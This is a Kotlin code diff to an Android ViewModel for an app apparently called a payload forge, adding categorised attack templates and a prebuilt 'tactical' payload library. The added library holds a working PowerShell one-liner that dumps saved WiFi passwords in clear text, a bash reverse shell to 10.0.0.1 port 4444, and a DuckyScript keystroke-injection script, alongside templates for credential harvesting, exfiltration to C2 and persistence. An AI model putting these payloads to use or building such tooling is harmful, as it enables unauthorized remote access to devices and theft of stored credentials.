@@ -13,7 +13,8 @@ import kotlinx.coroutines.launch
 data class PayloadTemplate(
     val name: String,
     val os: String,
-    val description: String
+    val description: String,
+    val category: String = "General"
 )
 
 class PayloadForgeViewModel(application: Application) : AndroidViewModel(application) {
@@ -30,10 +31,34 @@ class PayloadForgeViewModel(application: Application) : AndroidViewModel(applica
     private val prefs = application.getSharedPreferences("rabit_prefs", Context.MODE_PRIVATE)
 
     val templates = listOf(
-        PayloadTemplate("Reverse Shell", "Linux/Android", "Establish a persistent remote shell."),
-        PayloadTemplate("Credential Harvester", "Windows", "Extract stored browser passwords."),
-        PayloadTemplate("HID Keyboard Infiltration", "All", "Inject keystrokes to bypass UI locks."),
-        PayloadTemplate("Data Exfiltrator", "macOS", "Gather documents and upload to remote C2.")
+        PayloadTemplate("Reverse Shell", "Linux/Android", "Establish a persistent remote shell.", "C2"),
+        PayloadTemplate("Credential Harvester", "Windows", "Extract stored browser passwords.", "Recovery"),
+        PayloadTemplate("HID Keyboard Infiltration", "All", "Inject keystrokes to bypass UI locks.", "HID"),
+        PayloadTemplate("Data Exfiltrator", "macOS", "Gather documents and upload to remote C2.", "Exfiltration"),
+        PayloadTemplate("WiFi Pass Recovery", "Windows", "Export all saved WiFi profiles.", "Recovery"),
+        PayloadTemplate("Persistence Link", "Linux", "Add a cronjob or systemd service for persistence.", "Maintenance")
+    )
+
+    // Pre-built library for offline tactical use
+    val prebuiltPayloads = mapOf(
+        "WiFi Pass Recovery" to """
+            # Windows Tactical WiFi Recovery
+            netsh wlan show profiles | Select-String "\:(.+)" | %{${'$'}_.toString().Split(":")[1].Trim()} | %{netsh wlan show profile name="${'$'}_" key=clear} | Select-String "Key Content\W+\:(.+)"
+        """.trimIndent(),
+        "Reverse Shell" to """
+            # Linux One-Liner Tactical Shell
+            bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+        """.trimIndent(),
+        "HID Keyboard Infiltration" to """
+            # DuckyScript UI Bypass
+            GUI r
+            DELAY 500
+            STRING cmd
+            ENTER
+            DELAY 500
+            STRING echo You have been audited by Hackie Pro
+            ENTER
+        """.trimIndent()
     )
 
     fun generatePayload(targetOs: String, goal: String, language: String) {
@@ -69,6 +94,10 @@ class PayloadForgeViewModel(application: Application) : AndroidViewModel(applica
                 _isGenerating.value = false
             }
         }
+    }
+
+    fun usePrebuilt(name: String) {
+        _payloadCode.value = prebuiltPayloads[name] ?: "# Payload not found."
     }
 
     fun updateCode(newCode: String) {
